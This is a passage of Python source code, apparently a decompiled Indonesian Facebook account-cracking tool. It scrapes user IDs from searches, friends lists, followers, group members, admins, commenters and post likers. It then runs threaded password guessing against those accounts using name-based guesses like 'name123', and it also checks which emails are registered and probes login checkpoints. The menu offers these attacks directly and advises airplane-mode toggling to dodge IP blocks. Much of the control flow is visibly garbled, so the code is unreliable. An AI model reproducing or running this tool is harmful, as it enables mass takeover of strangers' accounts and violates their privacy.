            response = requests.get(f'https://web.facebook.com/profile.php?id={user_id}&sk=followers', headers=headers)
            fb_dtsg = re.search('\"dtsg\":{\"token\":\"(.*?)\"', response.text).group(1)
            lsd = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text).group(1)
            profile_id = user_id
            variables = {'count': 8, 'cursor': cursor, 'id': profile_id}
            data = {'fb_dtsg': fb_dtsg, 'lsd': lsd, 'variables': json.dumps(variables), 'doc_id': '7020067648075969'}
            response = requests.post('https://web.facebook.com/api/graphql/', headers=headers, data=data)
            result = response.json()
            followers = []
            if result.get('data', {}).get('node', {}).get('followers', {}).get('edges', []):
                for edge in result['data']['node']['followers']['edges']:
                    node = edge.get('node', {})
                    user_id = node.get('id', '')
                    name = node.get('name', '')
                    url = node.get('url', '')
                    username = re.search('facebook\\.com/(.*?)(?:\\?|$)', url)
                    username = username.group(1) if username else ''
                    if user_id and name:
                        pass  
        except Exception as e:
                    else:  
                        followers.append({'id': user_id, 'name': name, 'username': username})
            next_cursor = None
            if result.get('data', {}).get('node', {}).get('followers', {}).get('page_info', {}).get('end_cursor'):
                next_cursor = result['data']['node']['followers']['page_info']['end_cursor']
            return {'followers': followers, 'cursor': next_cursor}
                    return {'followers': [], 'cursor': None}

    def GET_MEMBER_COUNT(self, group_id, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            response = requests.get(f'https://web.facebook.com/groups/{group_id}/members', headers=headers)
            member_count = re.search('group_member_profiles\":{\"formatted_count_text\":\"(.*?)\"', response.text)
            if member_count:
                count_text = member_count.group(1)
                if 'K' in count_text:
                    return int(float(count_text.replace('K', '')) * 1000)
                if 'M' in count_text:
                    return int(float(count_text.replace('M', '')) * 1000000)
        except Exception as e:
            else:  
                return int(count_text.replace('.', '').replace(',', ''))
            else:  
                return 0
                return 0 + (None, e)
            else:  
                pass

    def NEXT_CURSOR_MEMBER(self, group_id, cursor, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie, 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'content-type': 'application/x-www-form-urlencoded'}
            response = requests.get(f'https://web.facebook.com/groups/{group_id}/members', headers=headers)
            fb_dtsg = re.search('\"dtsg\":{\"token\":\"(.*?)\"', response.text).group(1)
            lsd = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text).group(1)
            variables = {'count': 10, 'cursor': cursor, 'groupID': group_id, 'scale': 1.5}
            data = {'fb_dtsg': fb_dtsg, 'lsd': lsd, 'variables': json.dumps(variables), 'doc_id': '6621621524622624'}
            response = requests.post('https://web.facebook.com/api/graphql/', headers=headers, data=data)
            result = response.json()
            members = []
            if result.get('data', {}).get('node', {}).get('new_members', {}).get('edges', []):
                for edge in result['data']['node']['new_members']['edges']:
                    node = edge.get('node', {})
                    user_id = node.get('id', '')
                    name = node.get('name', '')
                    url = node.get('url', '')
                    username = re.search('facebook\\.com/(.*?)(?:\\?|$)', url)
                    username = username.group(1) if username else ''
                    if user_id and name:
                        pass  
        except Exception as e:
                    else:  
                        members.append({'id': user_id, 'name': name, 'username': username})
            next_cursor = None
            if result.get('data', {}).get('node', {}).get('new_members', {}).get('page_info', {}).get('end_cursor'):
                next_cursor = result['data']['node']['new_members']['page_info']['end_cursor']
            return {'members': members, 'cursor': next_cursor}
                    return {'members': [], 'cursor': None}

    def GET_KOMENTAR_COUNT(self, post_id, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            response = requests.get(post_id, headers=headers)
            comment_count = re.search('\"commentsCount\":(\\d+)', response.text)
            if comment_count:
                return int(comment_count.group(1))
        except Exception as e:
            pass  
        else:  
            pass  
        return 0
            return 0 + (None, e)
        else:  
            pass

    def NEXT_CURSOR_KOMENTAR(self, post_id, cursor, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie, 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'content-type': 'application/x-www-form-urlencoded'}
            response = requests.get(post_id, headers=headers)
            fb_dtsg = re.search('\"dtsg\":{\"token\":\"(.*?)\"', response.text).group(1)
            lsd = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text).group(1)
            feedback_id = re.search('\"feedback\":{\"id\":\"(.*?)\"', response.text)
            if feedback_id:
                feedback_id = feedback_id.group(1)
            else:  
                return {'commenters': [], 'cursor': None}
            variables = {'feedbackTargetID': feedback_id, 'count': 5, 'cursor': cursor, 'scale': 1.5}
            data = {'fb_dtsg': fb_dtsg, 'lsd': lsd, 'variables': json.dumps(variables), 'doc_id': '8183602325022493'}
            response = requests.post('https://web.facebook.com/api/graphql/', headers=headers, data=data)
            result = response.json()
            commenters = []
            if result.get('data', {}).get('feedback', {}).get('display_comments', {}).get('edges', []):
                for edge in result['data']['feedback']['display_comments']['edges']:
                    node = edge.get('node', {})
                    author = node.get('author', {})
                    user_id = author.get('id', '')
                    name = author.get('name', '')
                    url = author.get('url', '')
                    username = re.search('facebook\\.com/(.*?)(?:\\?|$)', url)
                    username = username.group(1) if username else ''
                    if user_id and name:
                        pass  
        except Exception as e:
                    else:  
                        commenters.append({'id': user_id, 'name': name, 'username': username})
            next_cursor = None
            if result.get('data', {}).get('feedback', {}).get('display_comments', {}).get('page_info', {}).get('end_cursor'):
                next_cursor = result['data']['feedback']['display_comments']['page_info']['end_cursor']
            return {'commenters': commenters, 'cursor': next_cursor}
                    return {'commenters': [], 'cursor': None}

    def GET_LIKES_COUNT(self, post_id, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            response = requests.get(post_id, headers=headers)
            likes_count = re.search('\"important_reactors\":{\"edges\":\\[\\]},\"id\":\"(.*?)\"', response.text)
            if likes_count:
                post_id = likes_count.group(1)
                variables = {'feedbackTargetID': post_id}
                fb_dtsg = re.search('\"dtsg\":{\"token\":\"(.*?)\"', response.text).group(1)
                lsd = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text).group(1)
                data = {'fb_dtsg': fb_dtsg, 'lsd': lsd, 'variables': json.dumps(variables), 'doc_id': '5305792199516847'}
                response = requests.post('https://web.facebook.com/api/graphql/', headers=headers, data=data)
                result = response.json()
                if result.get('data', {}).get('feedback', {}).get('reactors', {}).get('count'):
                    return int(result['data']['feedback']['reactors']['count'])
        except Exception as e:
            pass  
        else:  
            pass  
        return 0
        return 0
            return 0 + (None, e)
        else:  
            pass

    def NEXT_CURSOR_LIKES(self, post_id, cursor, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie, 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'content-type': 'application/x-www-form-urlencoded'}
            response = requests.get(post_id, headers=headers)
            fb_dtsg = re.search('\"dtsg\":{\"token\":\"(.*?)\"', response.text).group(1)
            lsd = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text).group(1)
            feedback_id = re.search('\"feedback\":{\"id\":\"(.*?)\"', response.text)
            if feedback_id:
                feedback_id = feedback_id.group(1)
            else:  
                return {'likers': [], 'cursor': None}
            variables = {'feedbackTargetID': feedback_id, 'count': 10, 'cursor': cursor, 'scale': 1.5, 'reactionID': None}
            data = {'fb_dtsg': fb_dtsg, 'lsd': lsd, 'variables': json.dumps(variables), 'doc_id': '5481225091927971'}
            response = requests.post('https://web.facebook.com/api/graphql/', headers=headers, data=data)
            result = response.json()
            likers = []
            if result.get('data', {}).get('feedback', {}).get('reactors', {}).get('edges', []):
                for edge in result['data']['feedback']['reactors']['edges']:
                    node = edge.get('node', {})
                    user_id = node.get('id', '')
                    name = node.get('name', '')
                    url = node.get('url', '')
                    username = re.search('facebook\\.com/(.*?)(?:\\?|$)', url)
                    username = username.group(1) if username else ''
                    if user_id and name:
                        pass  
        except Exception as e:
                    else:  
                        likers.append({'id': user_id, 'name': name, 'username': username})
            next_cursor = None
            if result.get('data', {}).get('feedback', {}).get('reactors', {}).get('page_info', {}).get('end_cursor'):
                next_cursor = result['data']['feedback']['reactors']['page_info']['end_cursor']
            return {'likers': likers, 'cursor': next_cursor}
                    return {'likers': [], 'cursor': None}

    def GROUP_FROM_QUERY(self, search, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            params = {'q': search}
            response = requests.get('https://web.facebook.com/search/groups/', params=params, headers=headers)
            groups = re.findall('\"__typename\":\".*?\",\"id\":\"(\\d+)\",\"__isProfile\":\".*?\",\"name\":\"(.*?)\".*?,\"url\":\"https://web.facebook.com/(.*?)\"', response.text)
            result = []
            for group_id, name, url in groups:
                result.append({'id': group_id, 'name': name, 'url': url})
            return result
        except Exception as e:
            return []
        else:  
            pass

    def NEXT_CURSOR_GROUP(self, search, cursor, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie, 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'content-type': 'application/x-www-form-urlencoded'}
            response = requests.get('https://web.facebook.com/search/groups/?q=' + search, headers=headers)
            fb_dtsg = re.search('\"dtsg\":{\"token\":\"(.*?)\"', response.text).group(1)
            lsd = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text).group(1)
            variables = {'count': 5, 'cursor': cursor, 'query': search, 'tsid': None, 'experience': {'encoded_server_defined_params': None, 'fbid': None, 'type': 'GROUPS_TAB'}, 'filters': [], 'text': ''}
            data = {'fb_dtsg': fb_dtsg, 'lsd': lsd, 'variables': json.dumps(variables), 'doc_id': '9836020469887924'}
            response = requests.post('https://web.facebook.com/api/graphql/', headers=headers, data=data)
            result = response.json()
            groups = []
            if result.get('data', {}).get('viewer', {}).get('search_results', {}).get('edges', []):
                for edge in result['data']['viewer']['search_results']['edges']:
                    node = edge.get('node', {})
                    if node.get('__typename') == 'Group':
                        group_id = node.get('id', '')
                        name = node.get('name', '')
                        url = node.get('url', '')
                        group_url = re.search('facebook\\.com/(.*?)(?:\\?|$)', url)
                        group_url = group_url.group(1) if group_url else ''
                        if group_id and name:
                            pass  
        except Exception as e:
                        else:  
                            groups.append({'id': group_id, 'name': name, 'url': group_url})
            next_cursor = None
            if result.get('data', {}).get('viewer', {}).get('search_results', {}).get('page_info', {}).get('end_cursor'):
                next_cursor = result['data']['viewer']['search_results']['page_info']['end_cursor']
            return {'groups': groups, 'cursor': next_cursor}
                    return {'groups': [], 'cursor': None}

    def ALL_ADMIN_GROUP(self, group_id, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            response = requests.get(f'https://web.facebook.com/groups/{group_id}/members/admins', headers=headers)
            admins = re.findall('\"__typename\":\"User\",\"id\":\"(\\d+)\",\"name\":\"(.*?)\",.*?,\"url\":\"https:\\\\\\/\\\\\\/web.facebook.com\\\\\\/(.*?)\"', response.text)
            result = []
            for admin_id, name, url in admins:
                result.append({'id': admin_id, 'name': name, 'url': url})
            return result
        except Exception as e:
            return []
        else:  
            pass

    def NEXT_ALL_ADMIN_GROUP(self, group_id, cursor, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie, 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'content-type': 'application/x-www-form-urlencoded'}
            response = requests.get(f'https://web.facebook.com/groups/{group_id}/members/admins', headers=headers)
            fb_dtsg = re.search('\"dtsg\":{\"token\":\"(.*?)\"', response.text).group(1)
            lsd = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text).group(1)
            variables = {'count': 10, 'cursor': cursor, 'groupID': group_id, 'scale': 1.5}
            data = {'fb_dtsg': fb_dtsg, 'lsd': lsd, 'variables': json.dumps(variables), 'doc_id': '6792793654143682'}
            response = requests.post('https://web.facebook.com/api/graphql/', headers=headers, data=data)
            result = response.json()
            admins = []
            if result.get('data', {}).get('node', {}).get('group_admins', {}).get('edges', []):
                for edge in result['data']['node']['group_admins']['edges']:
                    node = edge.get('node', {})
                    user_id = node.get('id', '')
                    name = node.get('name', '')
                    url = node.get('url', '')
                    username = re.search('facebook\\.com/(.*?)(?:\\?|$)', url)
                    username = username.group(1) if username else ''
                    if user_id and name:
                        pass  
        except Exception as e:
                    else:  
                        admins.append({'id': user_id, 'name': name, 'username': username})
            next_cursor = None
            if result.get('data', {}).get('node', {}).get('group_admins', {}).get('page_info', {}).get('end_cursor'):
                next_cursor = result['data']['node']['group_admins']['page_info']['end_cursor']
            return {'admins': admins, 'cursor': next_cursor}
                    return {'admins': [], 'cursor': None}

    def EMAILS(self, query):
        try:
            email_pattern = '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}'
            emails = re.findall(email_pattern, query)
            return emails
        except Exception as e:
            return []
        else:  
            pass

class CONVERT:
    def __init__(self):
        return

    def MENJADI_USERID(self, username):
        try:
            url = f'https://web.facebook.com/{username}'
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'}
            response = requests.get(url, headers=headers)
            user_id = re.search('userID\":\"(\\d+)\"', response.text)
            if user_id:
                return user_id.group(1)
        except Exception as e:
            return None

    def TANGGAL_SEKARANG(self):
        return datetime.now().strftime('%d-%B-%Y')

class CHECKER:
    def __init__(self):
        return

    def YOUR_FILES(self, filename):
        try:
            with open(filename, 'r') as f:
                pass  
        except Exception as e:
                return f.readlines()
                console.print('[bold red]File Yang Anda Masukan Kosong, Silahkan Coba Pilih File Lain dan Pastikan Nama File Sudah Benar Huruf Besar Kecilnya!')
                sys.exit()

    def LOGIN_CHECKPOINT(self, username, password, cookie):
        try:
            session = requests.Session()
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'en-US,en;q=0.9', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'Cookie': cookie}
            response = session.get('https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0', headers=headers)
            if 'checkpoint' in response.url:
                soup = parser(response.text, 'html.parser')
                form = soup.find('form', {'id': 'login_form'})
                if form:
                    data = {}
                    for input_tag in form.find_all('input'):
                        if input_tag.get('name'):
                            data[input_tag.get('name')] = input_tag.get('value', '')
                    else:  
                        data['email'] = username
                        data['pass'] = password
                        response = session.post(response.url, data=data, headers=headers)
                        if 'checkpoint' in response.url:
                            soup = parser(response.text, 'html.parser')
                            options = soup.find_all('input', {'name': 'submit[Continue]'})
                            if options:
                                return {'status': True, 'options': len(options), 'message': 'There are options available on your Facebook account.'}
        except Exception as e:
                        else:  
                            if 'two_factor' in response.url or 'two_factor' in response.text:
                                return {'status': False, 'options': 0, 'message': 'This option of Facebook account is two-factor authentication.'}
                        else:  
                            return {'status': False, 'options': 0, 'message': 'There was an error getting checkpoint options.'}
                        else:  
                            return {'status': False, 'options': 0, 'message': 'There are no options available on your Facebook account.'}
                else:  
                    return {'status': False, 'options': 0, 'message': 'There was an error getting checkpoint options.'}
            else:  
                return {'status': False, 'options': 0, 'message': 'There are no options available on your Facebook account.'}
                return {'status': False, 'options': 0, 'message': str(e)}
            else:  
                pass

class EMAILS:
    def __init__(self):
        return

    def YOUR_FILES(self, filename):
        try:
            with open(filename, 'r') as f:
                pass  
        except Exception as e:
                return f.readlines()
                console.print('[bold red]File Yang Anda Masukan Kosong, Silahkan Coba Pilih File Lain dan Pastikan Nama File Sudah Benar Huruf Besar Kecilnya!')
                sys.exit()

    def CHECKER(self, email):
        try:
            url = 'https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr'
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'en-US,en;q=0.9', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1'}
            session = requests.Session()
            response = session.get(url, headers=headers)
            soup = parser(response.text, 'html.parser')
            form = soup.find('form', {'id': 'identify_yourself_flow'})
            if form:
                data = {}
                for input_tag in form.find_all('input'):
                    if input_tag.get('name'):
                        data[input_tag.get('name')] = input_tag.get('value', '')
                data['email'] = email
                response = session.post(url, data=data, headers=headers)
                if 'recover/initiate' in response.url:
                    return True
        except Exception as e:
            pass  
        else:  
            pass  
        return False
        else:  
            return False
            return False
        else:  
            pass

class MENU:
    def __init__(self):
        self.terminal = TERMINAL()
        self.login = LOGIN()
        self.crack = CRACK()
        self.convert = CONVERT()
        self.checker = CHECKER()
        self.emails = EMAILS()

    def UTAMA(self, cookie, token, user):
        try:
            self.terminal.BANNER()
            self.terminal.CHECK_FLODER()
            ip = self.terminal.CHECK_IP()
            stats = self.login.JUMLAH_PENGGUNA(cookie, user['id'])
            console.print(f"[bold white]User :[bold green] {user['name']}\n[bold white]Status :[bold yellow] Siper Premium\n[bold white]IP :[bold red] {ip}\n[bold white]Joined :[bold green] {self.convert.TANGGAL_SEKARANG()}\n[bold white]Friends :[bold yellow] {stats['friends']}\n[bold white]Followers :[bold yellow] {stats['followers']}\n            \n[bold green]01[bold white]. Crack Dari Pencarian Nama   [bold green]08[bold white]. Convert Username Jadi Id\n[bold green]02[bold white]. Crack Dari Daftar Teman     [bold green]09[bold white]. Lihat Semua Hasil Crack\n[bold green]03[bold white]. Crack Dari Pengikut         [bold green]10[bold white]. Crack Dari Admin Group\n[bold green]04[bold white]. Crack Dari Member Group     [bold green]11[bold white]. Crack Dari Email Random\n[bold green]05[bold white]. Crack Dari Komentar         [bold green]12[bold white]. Valid Email Checker ([bold green]New[bold white])\n[bold green]06[bold white]. Cek Options Checkpoint      [bold green]13[bold white]. Keluar ([bold red]Exit[bold white])\n[bold green]07[bold white]. Crack Dari Like Postingan   ")
            choice = input('[bold white] > [bold green]')
            if choice == '1':
                search = input('Silahkan Masukan Nama Lengkap, Anda Bisa Menggunakan Koma Untuk Mengisi Beberapa Nama Sekaligus, Contoh :\nRozhak,Mark Zuckerberg *Gunakan CTRL + C Untuk Stop!: ')
                searches = search.split(',')
                for s in searches:
                    self.search_and_crack(s.strip(), cookie, token)
            else:  
                if choice == '2':
                    user_id = input('Silahkan Masukan Uid Akun Facebook, Pastikan Memiliki Teman Dan Dapat Terlhat Oleh Publik Anda Juga Dapat Menggunakan Koma Untuk Dump Masal, Seperti :\n100006609458697,757953543 *Gunakan CTRL + C Untuk Stop!: ')
                    user_ids = user_id.split(',')
                    for uid in user_ids:
                        self.friends_and_crack(uid.strip(), cookie, token)
        except KeyboardInterrupt:
                else:  
                    if choice == '3':
                        user_id = input('Silahkan Masukan Uid Akun Facebook, Pastikan Memiliki Pengikut Dan Dapat Terlhat Oleh Publik Anda Juga Dapat Menggunakan Koma Untuk Dump Masal, Seperti :\n100006609458697,757953543 *Gunakan CTRL + C Untuk Stop!: ')
                        user_ids = user_id.split(',')
                        for uid in user_ids:
                            self.followers_and_crack(uid.strip(), cookie, token)
                    else:  
                        if choice == '4':
                            group_id = input('Silahkan Masukan Userid Group, Pastikan Group Tersebut Tidak Terkunci dan Anda Bisa Menggunakan Koma Untuk Mengisi Group Yang Berbeda, Seperti :286209422822253,5324263181026009,3691206277644100 *Gunakan CTRL + C Untuk Stop!: ')
                            group_ids = group_id.split(',')
                            for gid in group_ids:
                                self.members_and_crack(gid.strip(), cookie, token)
                        else:  
                            if choice == '5':
                                post_id = input('Silahkan Masukan Link Postingan Pastikan Memiliki Komentar dan Gunakan Koma Untuk Mengisi Link Yang Berbeda, Contoh : https://www.facebook.com/100006609458697/posts/pfbid02K7gUUAnBXnng64cdjLRreC7yJHa8QCB8kfXbiq3NtrFiWpqNscn6j9biBmKER8Btl/?app=fbl *Gunakan CTRL + C Untuk Stop!: ')
                                post_ids = post_id.split(',')
                                for pid in post_ids:
                                    self.comments_and_crack(pid.strip(), cookie, token)
                            else:  
                                if choice == '6':
                                    self.check_checkpoint_options()
                                else:  
                                    if choice == '7':
                                        post_id = input('Silahkan Masukan Link Postingan Pastikan Memiliki Likes dan Gunakan Koma Untuk Mengisi Link Yang Berbeda, Contoh : https://www.facebook.com/100006609458697/posts/pfbid02K7gUUAnBXnng64cdjLRreC7yJHa8QCB8kfXbiq3NtrFiWpqNscn6j9biBmKER8Btl/?app=fbl *Gunakan CTRL + C Untuk Stop!: ')
                                        post_ids = post_id.split(',')
                                        for pid in post_ids:
                                            self.likes_and_crack(pid.strip(), cookie, token)
                                    else:  
                                        if choice == '8':
                                            username = input('Silahkan Masukan Username Akun Facebook, Pastikan Username Sudah Benar dan Akun Tidak Di Private,\nContoh: rozhak.official *Ingat Hanya Masukan Satu Username!: ')
                                            user_id = self.convert.MENJADI_USERID(username.strip())
                                            if user_id:
                                                console.print(f'[bold white]Link :[bold green] https://m.facebook.com/profile.php?id={user_id}')
                                            else:  
                                                console.print('[bold red]Username Tidak Ditemukan!')
                                        else:  
                                            if choice == '9':
                                                self.see_results()
                                            else:  
                                                if choice == '10':
                                                    group_id = input('Silahkan Masukan Userid Group, Pastikan Group Tersebut Tidak Terkunci dan Anda Bisa Menggunakan Koma Untuk Mengisi Group Yang Berbeda, Seperti :286209422822253,5324263181026009,3691206277644100 *Gunakan CTRL + C Untuk Stop!: ')
                                                    group_ids = group_id.split(',')
                                                    for gid in group_ids:
                                                        self.admins_and_crack(gid.strip(), cookie, token)
                                                else:  
                                                    if choice == '11':
                                                        name_domain = input('Silahkan Masukan Nama dan Domain, Anda Harus Menggunakan `|` Sebagai Pemisah. Hanya Memasukan Satu Nama dan Domain,\nContohnya : Rozhak|@gmail.com *Gunakan CTRL + C Untuk Stop!: ')
                                                        if '|' in name_domain:
                                                            name, domain = name_domain.split('|')
                                                            self.generate_emails_and_crack(name.strip(), domain.strip(), cookie, token)
                                                        else:  
                                                            console.print('[bold red]Format Tidak Valid!')
                                                    else:  
                                                        if choice == '12':
                                                            file_path = input('Silahkan Masukan File List Email, Pastikan File Tersebut Ada dan Dalam File Itu Hanya Memiliki `LIST` Email, Contohnya : Temporary/Email.txt *Periksa File Sebelum Melihat File!: ')
                                                            emails = self.checker.YOUR_FILES(file_path.strip())
                                                            self.validate_emails([e.strip() for e in emails])
                                                        else:  
                                                            if choice == '13':
                                                                console.print('[bold white]Terima Kasih Telah Menggunakan Program Kami, Kami Harap Anda Puas Dengan Hasil Yang Anda Dapatkan. Jika Anda Memiliki Pertanyaan Atau Saran, Jangan Ragu Untuk Menghubungi Kami!')
                                                                sys.exit()
                                                            else:  
                                                                console.print('[bold red]Pilihan Yang Anda Masukan Tidak Tersedia Dalam Fitur Kami, Silahkan Coba Dengan Pilihan Lain!')
                                                                self.UTAMA(cookie, token, user)
                        console.print('[bold white]Terima Kasih Telah Menggunakan Program Kami, Kami Harap Anda Puas Dengan Hasil Yang Anda Dapatkan. Jika Anda Memiliki Pertanyaan Atau Saran, Jangan Ragu Untuk Menghubungi Kami!')
                        sys.exit()
                    except Exception as e:
                        console.print('[bold red]TERJADI KESALAHAN TAK TERDUGA!')
                        sys.exit()

    def search_and_crack(self, search, cookie, token):
        try:
            console.print('[bold white]Anda Harus Menggunakan \"[bold red]MODE PESAWAT[bold white]\" Setiap 200 Username, Ini Dilakukan Agar Mengurangi Resiko IP Address\nTerblokir. Anda Juga Bisa Menekan[bold green] CTRL + Z[bold white] Untuk Berhenti!')
            dumps = DUMPS_GRAPHQL(cookie, token)
            count = dumps.GET_QUERY_COUNT(search, cookie)
            if count > 0:
                console.print(f'[bold white]Jumlah Username :[bold green] {count}')
                users = []
                cursor = ''
                while True:
                    result = dumps.NEXT_CURSOR_QUERY(search, cursor, cookie)
                    users.extend(result['users'])
                    sys.stdout.write(f'\r[bold white] DUMP @[bold green]{len(users)}/{count}')
                    sys.stdout.flush()
                    if len(users) % 100 == 0:
                        time.sleep(5)
                    if not result['cursor']:
                        break
                    cursor = result['cursor']
                if len(users) > 0:
                    self.terminal.BANNER()
                    console.print('[bold green]01[bold white]. Gunakan Password Lengkap ([bold green]Nama, Nama123, Nama12345, Dll[bold white])\n[bold green]02[bold white]. Gunakan Password Default ([bold green]Nama, Nama123, Nama12345[bold white])\n[bold green]03[bold white]. Gunakan Password Manual ([bold green]Sayang, 123456, Bangsat[bold white])\n[bold green]04[bold white]. Gunakan Password Gabungan ([bold green]Nama123, Nama12345 + Input[bold white])')
                    choice = input('[bold white] > [bold green]')
                    passwords = []
                    if choice == '1':
                        for user in users:
                            passwords.extend(self.crack.GENERATE_PASSWORD(user['name']))
                    else:  
                        if choice == '2':
                            for user in users:
                                name = user['name'].split()[0].lower()
                                passwords.extend([name, name + '123', name + '12345'])
                        else:  
                            if choice == '3':
                                manual_passwords = input('Silahkan Masukan Password, Anda Harus Menggunakan Lebih Dari[bold red] 6 Huruf[bold white] dan Anda Bisa Memakai Koma Untuk Password Acak, Contohnya :[bold green] Sayang,Cantik[bold white] *[bold red]Harap Isi Minimal Satu Password[bold white]!: ')
                                passwords = [p.strip() for p in manual_passwords.split(',')]
        except KeyboardInterrupt:
                            else:  
                                if choice == '4':
                                    manual_passwords = input('Silahkan Masukan Password, Anda Harus Menggunakan Lebih Dari[bold red] 6 Huruf[bold white] dan Anda Bisa Memakai Koma Untuk Password Acak, Contohnya :[bold green] Sayang,Cantik[bold white] *[bold red]Harap Isi Minimal Satu Password[bold white]!: ')
                                    manual = [p.strip() for p in manual_passwords.split(',')]
                                        for user in users:
                                            name = user['name'].split()[0].lower()
                                            passwords.extend([name, name + '123', name + '12345'])
                                            passwords.extend(manual)
                    self.terminal.BANNER()
                    console.print(f'[bold white]Jumlah Username :[bold green] {len(users)}')
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        for user in users:
                            executor.submit(self.crack.METODE, user['id'], passwords, cookie)
                console.print('[bold white]Terima Kasih Telah Menggunakan Program Kami, Kami Harap Anda Puas Dengan Hasil Yang Anda Dapatkan. Jika Anda Memiliki Pertanyaan Atau Saran, Jangan Ragu Untuk Menghubungi Kami!')
                sys.exit()

    def friends_and_crack(self, user_id, cookie, token):
        try:
            console.print('[bold white]Anda Harus Menggunakan \"[bold red]MODE PESAWAT[bold white]\" Setiap 100 Username, Ini Dilakukan Agar Mengurangi Resiko IP Address\nTerblokir. Anda Juga Bisa Menekan[bold green] CTRL + Z[bold white] Untuk Berhenti!')
            dumps = DUMPS_GRAPHQL(cookie, token)
            count = dumps.GET_FRIENDS_COUNT(user_id, cookie)
            if count > 0:
                console.print(f'[bold white] TEMAN...[bold green]{count}')
                friends = []
                cursor = ''
                while True:
                    result = dumps.NEXT_CURSOR_FRIENDS(user_id, cursor, cookie)
                    friends.extend(result['friends'])
                    sys.stdout.write(f'\r[bold white] DUMP @[bold green]{len(friends)}/{count}')
                    sys.stdout.flush()
                    if len(friends) % 100 == 0:
                        time.sleep(5)
                    if not result['cursor']:
                        break
                    cursor = result['cursor']
                if len(friends) > 0:
                    self.terminal.BANNER()
                    console.print('[bold green]01[bold white]. Gunakan Password Lengkap ([bold green]Nama, Nama123, Nama12345, Dll[bold white])\n[bold green]02[bold white]. Gunakan Password Default ([bold green]Nama, Nama123, Nama12345[bold white])\n[bold green]03[bold white]. Gunakan Password Manual ([bold green]Sayang, 123456, Bangsat[bold white])\n[bold green]04[bold white]. Gunakan Password Gabungan ([bold green]Nama123, Nama12345 + Input[bold white])')
                    choice = input('[bold white] > [bold green]')
                    passwords = []
                    if choice == '1':
                        for friend in friends:
                            passwords.extend(self.crack.GENERATE_PASSWORD(friend['name']))
                    else:  
